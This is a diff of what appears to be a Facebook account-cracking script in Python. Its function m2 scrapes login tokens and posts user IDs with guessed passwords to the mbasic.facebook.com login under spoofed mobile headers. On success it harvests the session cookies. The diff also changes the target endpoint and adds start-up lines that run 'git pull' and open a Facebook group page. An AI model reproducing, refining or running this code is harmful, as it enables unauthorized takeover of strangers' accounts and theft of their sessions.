@@ -1,156 +1,75 @@
-#---------------------[IMPORT]---------------------#
+#line1+line8=requests,
+
+import bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
 from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as tred
-import os,sys,time,json,random,re,string,platform,base64,platform,uuid
-import requests,random,sys,json,os,re
-from time import sleep
-from os import system
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
-import marshal
-import zlib
-import base64
-from datetime import date
-from datetime import datetime
-from time import sleep
-from time import sleep as waktu
-from random import random as acak
-from random import choice as pilih
-from random import randint
-from bs4 import BeautifulSoup
-import requests as ress
-from sys import exit as exit
-class jalan:
-    def __init__(self, z):
-        for e in z + "\n":
-            sys.stdout.write(e)
-            sys.stdout.flush()
-            time.sleep(0.0001)
-sys.stdout.write('\x1b[1;35m\x1b]2; The Davil \x07')
-###----------[ IMPORT LIBRARY ]---------- ###
-import requests
-import bs4
-import sys
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os
 import random
-import time
-import re
-import json
-import uuid
-import subprocess
-import marshal
-#import rich
-import shutil
-import webbrowser
-from random import randint
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-from bs4 import BeautifulSoup as par
-from datetime import date
-from datetime import datetime
-# from rich import print as printer
-from datetime import date
-import marshal
-try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python MRX-JIBON.py')
-from bs4 import BeautifulSoup
-from datetime import date
-from datetime import datetime
-from time import sleep
-from time import sleep as waktu
-#---------------------------------------------------------------------------#
-import os,sys,time,json,random,re,string,platform,base64,uuid
+import sys
+import bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
 from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup
-import requests as ress
-from datetime import date
-from datetime import datetime
-from time import sleep
-from os import system as s
-from time import sleep as waktu
+from concurrent.futures import ThreadPoolExecutor as tred
+import base64
+import os,sys,time,json,random,re,string,platform,base64
+#import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import mechanize
+#from requests.exceptions import ConnectionError
+import string
+print('[\033[1;32mâœ“\033[1;37m] Wait For Connect Server !! ')
+os.system('git pull')
+os.system(f'xdg-open https://facebook.com/groups/indianscommunitygeorgia/')
+time.sleep(2.00)
 try:
     import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+except ImportError:
+    print('\n [] installing requests !...\n')
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“] installing bs4 !...\n')
     os.system('pip install bs4')
-    
-RED = '\033[1;91m'
-WHITE = '\033[1;97m'
-GREEN = '\033[1;32m' 
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-ORANGE = '\033[1;35m'
-P = '\x1b[1;97m' 
-M = '\x1b[1;91m' 
-H = '\x1b[1;92m' 
-K = '\x1b[1;93m' 
-B = '\x1b[1;94m' 
-U = '\x1b[1;95m' 
-O = '\x1b[1;96m' 
-N = '\x1b[0m'    
-A = '\x1b[1;90m' 
-BN = '\x1b[1;107m' 
-BBL = '\x1b[1;106m' 
-BP = '\x1b[1;105m' 
-BB = '\x1b[1;104m' 
-BK = '\x1b[1;103m' 
-BH = '\x1b[1;102m' 
-BM = '\x1b[1;101m' 
-BA = '\x1b[1;100m' 
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today() 
-loop = 0
-cp = []
-ok = []
-twf = []
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
-#-----------------------[DATE CHECKER]-----------------------#
-def Jawnx(uid):
-    if len(uid)==15:
-        if uid[:10] in ['1000000000']       :hking = ' 2009'
-        elif uid[:9] in ['100000000']       :hking = '~> 2009'
-        elif uid[:8] in ['10000000']        :hking = '~> 2009'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:hking = '~> 2009'
-        elif uid[:7] in ['1000006','1000007','1000008','1000009']:hking = ' 2010'
-        elif uid[:6] in ['100001']          :hking = '~> 2010/2011'
-        elif uid[:6] in ['100002','100003'] :hking = '~> 2011/2012'
-        elif uid[:6] in ['100004']          :hking = '~> 2012/2013'
-        elif uid[:6] in ['100005','100006'] :hking = '~> 2013/2014'
-        elif uid[:6] in ['100007','100008'] :hking = '~> 2014/2015'
-        elif uid[:6] in ['100009']          :hking = '~> 2015'
-        elif uid[:5] in ['10001']           :hking = '~> 2015/2016'
-        elif uid[:5] in ['10002']           :hking = '~> 2016/2017'
-        elif uid[:5] in ['10003']           :hking = '~> 2018/2019'
-        elif uid[:5] in ['10004']           :hking = '~> 2019/2020'
-        elif uid[:5] in ['10005']           :hking = '~> 2020'
-        elif uid[:5] in ['10006','10007','']:hking = '~> 2021'
-        elif uid[:5] in ['10008']           :hking = '~> 2022'
-        elif uid[:5] in ['10009']           :hking = '~> 2023'
-        else:hking=''
-    elif len(uid) in [9,10]:
-        hking = '~> 2008/2009'
-    elif len(uid)==8:
-        hking = '~> 2007/2008'
-    elif len(uid)==7:
-        hking = '~> 2006/2007'
-    else:hking=''
-    return hking
+R = '\033[1;31m' # PUTIH
+G = '\033[1;32m' # PUTIH
+H = '\033[1;32m' # PUTIH
+Y = '\033[1;33m' # PUTIH
+Q = '\033[1;37m'
+T = '\033[1;34m'
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+from concurrent.futures import ThreadPoolExecutor as ahmadAXI
+from datetime import datetime
+from bs4 import BeautifulSoup
+R = '\x1b[1;91m' 
+G = '\x1b[1;92m' 
+Y = '\x1b[1;93m' 
+### WARNA RANDOM ###
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+MXD = '\033[1;92m' #MAHADIGREEN
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
+ct = datetime.now()
+n = ct.month
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
 try:
     if n < 0 or n > 12:
         exit()
@@ -484,7 +403,7 @@ def m2(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -495,23 +414,26 @@ def m2(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
-			'method': 'GET',
-			'path': 'https://free.facebook.com/?_rdc=1&_rdr',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding': 'gzip, deflate, br',
-			'accept-language': 'en-US,en;q=0.9',
-			'referer': 'https://free.facebook.com/',
-			'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-			'sec-ch-ua-mobile': '?0',
-			'sec-ch-ua-platform': '"Windows"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'same-origin',
-			'upgrade-insecure-requests': '1',
-			'user-agent': pro,}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method':'GET',
+            'path': '/',
+            'scheme':'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro,}
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
